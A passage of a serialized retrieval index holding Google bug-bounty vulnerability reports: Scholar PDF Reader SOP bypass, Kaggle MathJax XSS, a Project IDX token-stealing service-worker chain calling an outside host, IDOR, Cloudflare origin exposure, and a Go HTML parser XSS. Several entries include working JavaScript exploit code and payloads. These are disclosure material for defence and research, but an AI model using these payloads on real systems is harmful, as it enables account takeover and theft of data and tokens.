\"\r\nhttps://webhook.site/148d5a3a-72a7-49dd-85d8-31f15887096f\"\r\nAll traces from the attack are removed from the DOM, and a value is stored to LocalStorage so the attack is only performed once and the attacked developer won't get suspicious.\r\nAcquisition info:\r\nFabric + Firebase - longer than 6 Months ago - see\r\nhttps://fabric.io/blog/2017/10/31/fabric-firebase-now-stronger-together/", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2682, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "96a679f4-bc53-4b53-9730-a8b354a5fa7b": {"__data__": {"id_": "96a679f4-bc53-4b53-9730-a8b354a5fa7b", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_865163.clean.txt", "file_name": "20250408_175642_865163.clean.txt", "file_type": "text/plain", "file_size": 1999, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "6966d56d-9de7-4eb3-a604-b171afe00f6c", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_865163.clean.txt", "file_name": "20250408_175642_865163.clean.txt", "file_type": "text/plain", "file_size": 1999, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "70d312adc22e58247cf7c8009d15e8b624275557216a4f3a31fffcc420fafbbd", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nSOP bugs in Google Scholar PDF Reader\r\nProduct:\r\nGoogle Scholar\r\nURL:\r\nhttps://chromewebstore.google.com/detail/google-scholar-pdf-reader/dahenjhkoodjbpjheillcadbppiidmhp\r\nVulnerability type:\r\nSite Isolation Bypass\r\nDetails\r\n--- BUG 1 (With compromised renderer) ---\r\n// In the context of a content script on any website.\r\n// Leaked data must be JSON parsable.\r\nlet x = chrome.runtime.connect();\r\nx.postMessage({type: 'fetch', method: 'GET', url: '\r\nhttps://www.google.com/something.json'\r\n, id: 1});\r\nx.onMessage.addListener(console.log);\r\n--- BUG 2 (Without compromised renderer) ---\r\n// Embed victim PDF from attacker page.\r\nlet f=document.createElement('iframe');\r\nf.width=1000;\r\nf.height=1000;\r\nf.src='\r\nhttps://services.google.com/fh/files/misc/bvp_order_form_google_06162020.pdf'\r\n;\r\ndocument.body.appendChild(f);\r\n// Navigate nested, nested frame to attacker controled page with null origin.\r\nf.contentWindow[0][0].location = '\r\nhttps://terjanq.me/xss.php?h[Content-Security-Policy]=sandbox%20allow-scripts'\r\n// I think this also creates a race condition version\r\n// On that attacker page, Make sure target page to leak is same-origin as the pdf\r\nhttps://services.google.com\r\nin this case.\r\nonmessage = async (e) => {\r\nlet reader = e.data.body.pipeThrough(new TextDecoderStream()).getReader();\r\nlet result = await reader.read();\r\nconsole.log(result.value);\r\n}\r\nparent.parent.postMessage({type: 'fetch', url: '\r\nhttps://services.google.com/example'}\r\n, '*');\r\n--- BUG 3 (Without compromised renderer) ---\r\nSelected text gets leaked cross-origin.\r\nonmessage=console.log;\r\nf.contentWindow[0].postMessage({type: 'getSelectedText'}, '*');\r\nAttack scenario\r\nAn attacker controlled website can bypass SOP if one of the follow is met:\r\nAttacker wants JSON data and has a compromised renderer bug\r\nAttacker wants data from a origin that contains a PDF which allows embedding\r\nExtension owner of Google LLC has verified scholar.google.com the contact is\r\nscholar-chrome-extensions@google.com", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1999, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "67713d80-8fbd-4a2b-846c-7d07831a324a": {"__data__": {"id_": "67713d80-8fbd-4a2b-846c-7d07831a324a", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_561128.clean.txt", "file_name": "20250408_175703_561128.clean.txt", "file_type": "text/plain", "file_size": 3054, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "d0dc3f8a-98cb-4f10-b33c-93ab92d95dbe", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_561128.clean.txt", "file_name": "20250408_175703_561128.clean.txt", "file_type": "text/plain", "file_size": 3054, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "d551df769273180e638ae6303f93c192e1935f50323514db2a56465f0f47b0f1", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nSingle click account takeover in Kaggle\r\nProduct:\r\nKaggle\r\nURL:\r\nhttps://www.kaggle.com/datasets/\r\nVulnerability type:\r\nPermissions Bypass\r\nDetails\r\nThis report actually is 2 reports looped into one which I thought would be best since there exists a mechanism to fix both problems together. But  please note the root cause for both is different.\r\nSingle click account takeover in Kaggle.com via xss\r\nReproduction steps:-\r\n1) Go to Kaggle.com on the left sidebar go to datasets and create a new dataset.(Title it anything and just upload any file to create)\r\n2) Go to the webpage of the dataset and edit  'about dataset'.\r\n3)This part allows markdown and allows us to add Mathjax .We are getting stored XSS . Add the code\r\n$$ \\href{javascript:alert(1)}{Click Me!} $$\r\nand save the description.\r\n4) You will see Click me! though I havent been able to bypass the CSP you can see the the domtree the href tag is active and when clicked should execute\r\njavascript:alert(document.domain)\r\n5) I was able to ESCALATE this xss to single-click account takeover since Kaggle does not add httpOnly cookies. So it's trivial to steal a user's cookie.\r\nCSS injection in Kaggle.com\r\nIf you normally try to inject CSS via the markdown you will notice that kaggle's sanitisers will block your attempts. I was able to inject CSS into Kaggle via the \\style element in Mathjax\r\n1) Follow the steps 1-2 in the above report\r\n2)Edit the the about dataset and then paste\r\n$$ \\style{background-color: #4b6bb7;padding: 100px; }{CSS} $$\r\nand save it.\r\n3) You will see the CSS on the page( Please refer to the attachment Kaggle_1 for quick verification)(Though the CSS is inside a div tag its always possible to BLEED the CSS to control the entire page.)\r\nAttack scenario\r\nKaggle is a subsidiary of google acquired 6 years ago\r\nhttps://en.wikipedia.org/wiki/Kaggle\r\n. It is a data science platform that allows users to participate in data science-related contests and run and share their code.\r\nI dont think i need to elaborate on the impact of the account takeover as thats already devastating.\r\nFor the css injection it should be trivial to create a fake signin page with the real url of Kaggle.com so thats pretty impactful. Please note that its also possible to inject CSS class name and CSS attribute id vie mathjax via the following code\r\n1)\r\n$$\\class{name}{any text}$$\r\n2)\r\n$$\\cssId{id}{any text}$$\r\nI didn't find an exploitation method on this but maybe it can be looped in somehow.\r\nNow for the fix and why i think you should consider the impact as 2 seperate bugs and not 1 major but and why i didnt make 2 seperate reports.\r\nGenerally google would have to implement closure library sanitization for each of the above attack vectors. But mathjax offers a Safe Mode which can be configured to fix them together\r\nhttps://docs.mathjax.org/en/v2.7-latest/options/other/Safe.html#configure-safe\r\nI would encourage google to consider this as 2 separate bugs since the root cause is different though they are similar. And i also have chained bugs to escalate the impact.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3054, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "c9713caf-7ac6-462d-ab32-69892219dc5a": {"__data__": {"id_": "c9713caf-7ac6-462d-ab32-69892219dc5a", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_765733.clean.txt", "file_name": "20250408_175705_765733.clean.txt", "file_type": "text/plain", "file_size": 2114, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "f679cce1-0d1f-4e14-a9cc-a3c5eb6a205b", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_765733.clean.txt", "file_name": "20250408_175705_765733.clean.txt", "file_type": "text/plain", "file_size": 2114, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "b29222e2a7ed631cfe3b9f6ee33df603c0be05895d2233afee2b172d6a92bd04", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nUpdate source code at:\r\nhttps://www.partneradvantage.goog/GCPPRM/s/contentdocument/ContentDocument/All\r\nProduct:\r\nOther - Google VRP\r\nURL:\r\nVulnerability type:\r\nRemote Code Execution (RCE)\r\nDetails\r\nHello,\r\nHope you are doing well. I wanted to report the following issue. If you login to:\r\nhttps://www.partneradvantage.goog/GCPPRM/s/\r\nand visit the below URL:\r\nand then click \"Libraries\" on the left menu. There are two folders:\r\n1) PRM Content\r\n2) PRM Content Japanese\r\nBoth of these folders contain flexipage-meta files. Flexipage-meta XML files are what SalesForce uses to dynamically construct and display pages on the site. In both of these folders, all of the files can be completely updated or deleted. If you visit an example file:\r\nhttps://www.partneradvantage.goog/GCPPRM/s/contentdocument/0694M00000JWyyBQAT\r\nyou can see on the right side, the file owner is a google employee. You can also see that it is possible to upload a new version or completely delete the file. In this example, under file details, we can see this file is tied to this URL path:\r\nhttps://www.partneradvantage.goog/GCPPRM/s/artificial-intelligence\r\nRegular users shouldn't have the ability to update or delete any of these files. Right now anyone can update the code here. For example, I can put a script alert tag into the code or change it to whatever I want. Updating the code though, doesn't automatically lead to a change in the page. To actually update the page, someone needs to run force:source:push. This would eventually happen as part of the development progress.\r\nAttack scenario\r\nA regular user shouldn't be able to update the source code files of this site. A malicious user could update or delete all of these files.\r\nIf the files were updated/deleted and someone runs force:source:push the site would then update. I didn't want to leave any malicious files up there in case there is a regular update schedule or something like that, but it would be useful to take a look at the deployment process here and make sure none of the files have been updated/changed.\r\nLet me know if you have questions. Thanks!", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2114, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "f1df7e76-9b81-4eff-9cea-0c0e7efabd32": {"__data__": {"id_": "f1df7e76-9b81-4eff-9cea-0c0e7efabd32", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_664605.clean.txt", "file_name": "20250408_175656_664605.clean.txt", "file_type": "text/plain", "file_size": 1711, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "b2672711-e716-48bc-a25c-dd71e0455c29", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_664605.clean.txt", "file_name": "20250408_175656_664605.clean.txt", "file_type": "text/plain", "file_size": 1711, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "e06c322e77dce12b8b5702a84c6d6cf5a5b9aba7c12e6ff29d39dc8ed0bee5f1", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nCloud Flare Bypass Origin IP's Lead To Access To lab.mandiant.com    Description: I have discovered that the\r\nhttps://216.71.112.199/\r\nsite exposed it's IP which could allow bypassing of anti-DDoS mech\r\nProduct:\r\nlab.mandiant.com\r\nURL:\r\nVulnerability type:\r\nunknown\r\nDetails\r\nCloud Flare Bypass Origin IP's Lead To Access To lab.mandiant.com\r\nDescription:\r\nI have discovered that the\r\nsite exposed it's IP\r\nwhich could allow bypassing of anti-DDoS mechanisms i.e you are using\r\nCloudflare for protection.\r\nFor Originate IP address which I found from\r\nhttps://shodan.io\r\nBy using these IP address as a resolver instead of the intended\r\naddresses I'm able to access the service without going through the\r\nWAF, thus I'm able to forward unfiltered payloads to the service, as\r\nwell as avoiding the common protections offered by Cloudflare, also\r\nbeing able to perform crippling denial-of-service towards the origin.\r\nIp Exposed\r\nImpact:\r\nAs reported in many other submissions, Cloudflare bypasses can have a\r\nsignificant impact, as any adversary is now able to communicate with\r\nthe origin server directly, enabling them to perform unfiltered\r\nattacks (such as denial-of-service), and data retrieval\r\nIt makes the implementation of WAF on that domain useless since an attacker is able to directly access the server using its IP, WAF bypasses can have a significant impact, as any adversary is now able to communicate with the origin server directly, enabling them to perform unfiltered attacks (such as denial-of-service), and data retrieval.\r\nNOTE:\r\nIn attached POC it clears Demonstrates that the accompanied domain runs the same content as the IP\r\nThe Ip is Not Protected by Cloudflare\r\nAttack scenario", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1711, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "45a4aec0-1394-4489-a4b2-f504b4846085": {"__data__": {"id_": "45a4aec0-1394-4489-a4b2-f504b4846085", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_899111.clean.txt", "file_name": "20250408_175658_899111.clean.txt", "file_type": "text/plain", "file_size": 1712, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "7ad6a982-52a2-484d-90b4-9f4a398084ff", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_899111.clean.txt", "file_name": "20250408_175658_899111.clean.txt", "file_type": "text/plain", "file_size": 1712, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "f8cfbc36aa7d36ffbc729652a6928faa214e6923c7e832ad3282b1d859709b0e", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nIDOR on terra-devel-flagsmith.api.verily.com can create a master-api-key on different organisations.\r\nProduct:\r\nOther - Google VRP\r\nURL:\r\nhttps://terra-devel-flagsmith.api.verily.com/organisation-settings#\r\nVulnerability type:\r\nOther\r\nDetails\r\nHello security security team.\r\nHope you're good there.\r\nI found idor on terra-devel-flagsmith.api.verily.com subdomain which can create api key for another organizations.\r\nThat subdomain hosted a open-source software called flagsmith .\r\nAll I think is verily developers using this for remote config management.\r\nThere is a master key which is also called terraform key . The use of the key is specified in documentation\r\nhttps://docs.flagsmith.com/integrations/terraform\r\n.\r\nI found that an Attacker can create apo-key for other victim's organization .\r\nSteps to reproduce\r\nMake two different account with different emails and make different organisations with respective to that accounts.\r\nafter logged in click on manage then you'll land on some settings page.\r\nClick on button next to terraform api keys .\r\nThe options ask you to name the respective api key and set expiration limit.\r\nTurn on intercept in burp proxy now .\r\nSet the name something and date to never And click create.\r\nThe POST request is going to endpoint\r\n/api/v1/organisations/{your org I'd }/master-api-keys/\r\nChange the value of organisation in body to the victims organization id.\r\nSend the request and see in the other account the new api key is created.\r\nAn attacker also has that api-key.\r\nAttack scenario\r\nAn attacker can later use that key to integrate with .ther orgs account .\r\nAs I mentioned attacker also know the api-key which is the master key of victim's organization now.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1712, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "26eca0da-e48d-4b4f-92be-c38e2041767d": {"__data__": {"id_": "26eca0da-e48d-4b4f-92be-c38e2041767d", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_797159.clean.txt", "file_name": "20250408_175642_797159.clean.txt", "file_type": "text/plain", "file_size": 2352, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "a725a72b-3602-4e55-b12f-4f7fcf3172a8", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_797159.clean.txt", "file_name": "20250408_175642_797159.clean.txt", "file_type": "text/plain", "file_size": 2352, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "33c0ecbc8aefa997ffbc02a5b72178981ab096148bcf37229570ff9bfa7581fa", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nInsecure debugger on Project IDX\r\nProgram:\r\nGoogle VRP\r\nURL:\r\nhttps://idx.google.com/\r\nVulnerability type:\r\nCross-site scripting (XSS)\r\nDetails\r\nFeature being abused:\r\nhttps://developers.google.com/idx/guides/debug-in-idx#chrome-devtools\r\nCreate project as simple html.\r\nOnce loaded, Take the <ID> from an iframe in the format\r\nhttps://9000-monospace-<ID>.cloudworkstations.dev\r\n(In a real attack this could be leaked from the network)\r\nRun the following from any website replacing <ID> with your own ID.\r\n// Vulnerable debugger proxy (Runs any js code you want, Fetch as the victims server)\r\nlet target = 'https://8282-monospace-<ID>.cloudworkstations.dev/proxy?url=';\r\n// Link to our service worker\r\nlet proxy = new URL('https://terjanq.me/xss.php');\r\nproxy.searchParams.set('ct', 'application/javascript');\r\nproxyPayload = `\r\nself.addEventListener(\"fetch\", (event) => {\r\nlet url = event.request.url;\r\n// Leak token from network since its a httponly cookie\r\nif (url.includes(\"_workstation/login\")) {\r\nconsole.info('\ud83c\udf89 Leaked token: '+url);\r\n}\r\n});\r\n`;\r\nproxy.searchParams.set('html', proxyPayload);\r\n// Link to force a reauth\r\nlet reauth = new URL('https://terjanq.me/xss.php');\r\nreauth.searchParams.set('h[Clear-Site-Data]', '\"cookies\"');\r\nreauthPayload = `\r\nsetTimeout(() => { location.href=location.origin }, 3000);\r\nreauth.searchParams.set('js', reauthPayload);\r\n// Link to create service work\r\nlet setup = new URL('https://terjanq.me/xss.php');\r\nsetupPayload = `\r\nnavigator.serviceWorker.register(\"${target+encodeURIComponent(proxy.href)}\");\r\nsetTimeout(() => { location.href=\"${target+encodeURIComponent(reauth.href)}\" }, 3000);\r\nsetup.searchParams.set('js', setupPayload);\r\n// Do the stuff\r\nlocation = target+encodeURIComponent(setup.href);\r\nIn the console you should see a message that says \"leaked token\" of the format\r\nhttps://8282-monospace-<ID>.cloudworkstations.dev/_workstation/login?redirect=<secret>\r\nin a new browser go to that URL and you will be logged in to the debugger.\r\nYou will have got a\r\nWorkstaionJwt\r\nfrom that by changing the domain of this cookie for example to\r\n80-monospace-<ID>.cloudworkstations.dev\r\nyou can login to the IDE!\r\nAttack scenario\r\nProject IDX takeover via local network attacker.\r\nThis is experimental and I'm not expecting a reward for this but you might want to know before full release :)", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2349, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "33af227e-e206-4028-ab0e-d3cbbe376b90": {"__data__": {"id_": "33af227e-e206-4028-ab0e-d3cbbe376b90", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175735_647466.clean.txt", "file_name": "20250408_175735_647466.clean.txt", "file_type": "text/plain", "file_size": 670, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "68a326f2-17e9-418c-98ba-8e509ecc52b6", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175735_647466.clean.txt", "file_name": "20250408_175735_647466.clean.txt", "file_type": "text/plain", "file_size": 670, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "1537422408dc7f5a433b5897006537e6a0bc3586b538e8e8c2d6ed0a0f7037f1", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: changing the user id, I can see name of user and password length and other details.\r\nSteps to reproduce:\r\nJust go to \"\r\nhttps://www.bitium.com/2/users/sign_in\"\r\nand intercept the request using any intercepting proxy(i have used Burp Suite).\r\nSend the request to repeater and change the id here.\r\nThis will leak the details in response.\r\nBrowser/OS: All\r\nAttack scenario:\r\nBy changing the ID, i can see partial details of the clients, length of password, support email.\r\nAttacker can use this info for social engineering. Also if any API uses user id and or client name in any API to display info of client, he can use this info of users and id to see that also.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 670, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "8ef55d67-62f4-4e2d-8069-fe5273630b68": {"__data__": {"id_": "8ef55d67-62f4-4e2d-8069-fe5273630b68", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175645_127626.clean.txt", "file_name": "20250408_175645_127626.clean.txt", "file_type": "text/plain", "file_size": 2470, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "6509e95e-6685-4525-8f38-0ccfdae41fe3", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175645_127626.clean.txt", "file_name": "20250408_175645_127626.clean.txt", "file_type": "text/plain", "file_size": 2470, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "954446807aecc31976ee1b5d7126b37b2e993c5be8d2faf9ee42ec6ac5633483", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nfix toJSON spelling in firestore sdk\r\nProduct:\r\nGoogle Cloud\r\nURL:\r\nhttps://github.com/googleapis/nodejs-firestore\r\nVulnerability type:\r\nOther\r\nDetails\r\nHi,\r\nLanguage: NodeJS\r\nNPM Repository:\r\nhttps://www.npmjs.com/package/@google-cloud/firestore\r\nCode Repository:\r\nI found out that the wrong spelling of toJSON function ( it was toJson ) could leak to the firestore key getting leaked out when JSON.stringify() is run on any firestore object since all of them contain an internal reference to the firestore object having _settings object which has the private key\r\nI raised a Pull request highlighting the same\r\nhttps://github.com/googleapis/nodejs-firestore/pull/1983\r\nSince i was thinking from the view of Firebase, milaGGL pointed out that the bug was not reproducible so I edited my PR to remove the unnecessary code. I was unable to convey my message that it was exploitable when this library was used directly without any wrappers like nodejs firebase admin sdk library\r\nAnother developer reverts my commit to change the code to match exactly my original Pull request here\r\nhttps://github.com/googleapis/nodejs-firestore/pull/1989/commits/7b8a9755bde1b86172fc65f810a54d0f1d0c82e1\r\n[ it reverts my commit and is totally same to my original PR ] in this\r\nhttps://github.com/googleapis/nodejs-firestore/pull/1989\r\nHe has reviewed my PR and has reintroduced the code with the correct toJSON function spelling like i had suggested in my original PR and which was my original intention\r\nThis contribution was a security related one which is why i am filing it here\r\nI hope you understand how my contribution lead to the current state of the corrected code, I request you to review this and assign a CVE ID which also includes links to my PR so i can cite it.\r\nI would also like to argue my case for a bounty since the this concept was originally pioneered and raised by me\r\nAttack scenario\r\nThe vulnerability that was fixed eventually closed a loophole which leaked or exposed the private key using which the google cloud firestore nodejs-sdk library was initialised upon logging of any firestore objects like document snapshots, references, etc when serialised using JSON.stringify\r\nThe wrong spelling of toJSON as toJson in the original codebase state meant that the function toJson which was written to prevent serialisation of the firestore private key did not get triggered if JSON.stringify was run upon it\r\nI raised a PR to fix this and it is fixed now", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2470, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "a8994e4b-f0a4-4f78-bf5b-5ca28cdaa25b": {"__data__": {"id_": "a8994e4b-f0a4-4f78-bf5b-5ca28cdaa25b", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_608027.clean.txt", "file_name": "20250408_175703_608027.clean.txt", "file_type": "text/plain", "file_size": 2854, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "3eda2b51-7e17-4304-8074-2711dcc853b5", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_608027.clean.txt", "file_name": "20250408_175703_608027.clean.txt", "file_type": "text/plain", "file_size": 2854, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "ba6102406f3ca3de0961f57f2269d28efd22563341d8be4f80f92029276c7236", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nInvalid parsing of empty comments by Golang's net/html leads to XSS\r\nProduct:\r\nGolang\r\nURL:\r\nhttps://github.com/golang/net\r\nVulnerability type:\r\nunknown\r\nDetails\r\nThe way Golang's net/html library parses HTML comments is inconsistent with what the browser does.\r\nBoth treat\r\n<!-->\r\nas an empty comment.\r\nBoth allow\r\n--!>\r\nto be the closing comment tag ie.\r\n<!-- this is the comment --!>\r\n.\r\nBut combining these two in an empty comment like this:\r\n<!--!>\r\nThe browser only treats this as a comment opening while\r\nnet/html\r\ntreats this as an empty comment.\r\nThus, when seeing this input:\r\n<!--!> <h1 value=\"--><a href=\"javascript:alert(document.domain)\">link\r\nThe browser sees:\r\n<!--\r\nas a comment opening\r\n!> <h1 value=\"\r\nas the comment's content\r\n-->\r\nas the comment closing\r\n<a href=\"javascript:alert(document.domain)\">link\r\nas an\r\na\r\ntag with a\r\nhref\r\nattribute of\r\njavascript:alert(document.domain)\r\nsees:\r\nas an empty comment\r\n<h1 value=\"--><a href=\"javascript:alert(document.domain)\">\r\nh1\r\nvalue\r\n--><a href=\r\nand\r\nas an attribute name without a value.\r\nAttack scenario\r\nThis discrepancy leads to an XSS in some contexts.\r\nFor example:\r\npackage main\r\nimport (\r\n\"fmt\"\r\n\"io/ioutil\"\r\n\"log\"\r\n\"strings\"\r\n\"golang.org/x/net/html\"\r\n)\r\nfunc readHtmlFromFile(fileName string) (string, error) {\r\nbs, err := ioutil.ReadFile(fileName)\r\nif err != nil {\r\nreturn \"\", err\r\n}\r\nreturn string(bs), nil\r\nfunc is_allowed_html(text string) bool {\r\ntkn := html.NewTokenizer(strings.NewReader(text))\r\nfor {\r\ntt := tkn.Next()\r\nswitch {\r\ncase tt == html.ErrorToken:\r\nreturn true\r\ncase tt == html.StartTagToken:\r\nt := tkn.Token()\r\nif t.Data == \"h1\" {\r\ncontinue\r\n} else {\r\nreturn false\r\nfunc main() {\r\nfileName := \"index.html\"\r\ntext, err := readHtmlFromFile(fileName)\r\nlog.Fatal(err)\r\nvalid := is_allowed_html(text)\r\nfmt.Println(valid)\r\n// html is safe, we can proceed\r\nHere's a code that loads the aforementioned HTML file and checks whether there are any tags other than h1 (quite a strict allowlist if you ask me). If such HTML is deemed safe by this code and presented to the user, they are at risk of an XSS.\r\nNote that there's no threat when the element is serialised back by the library. The String method always outputs the comments as\r\nreturn \"<!--\" + EscapeString(t.Data) + \"-->\"\r\nwhere t.Data is the comment's content. This doesn't lead to an XSS.\r\nSimilarly, if we use\r\nhtml.Parse\r\nand then\r\nhtml.Render\r\non our input, that's what we get back:\r\n<!----><html><head></head><body><h1 value=\"--&gt;&lt;a href=\" javascript:alert(document.domain)\"=\"\">link</h1></body></html>\r\nwhich also won't lead to an XSS.\r\nHowever, as the built-in library\r\nis used in many different contexts where this behaviour can be exploited.\r\nFor reference, here's a similar issue with XML parsers' comment handling that led to iOS sanbdox escape:\r\nhttps://blog.siguza.net/psychicpaper/", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2854, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "25587ad1-5990-4f01-ab6e-38d8c3e24ed4": {"__data__": {"id_": "25587ad1-5990-4f01-ab6e-38d8c3e24ed4", "embedding": null, "metadata": {"file_path": 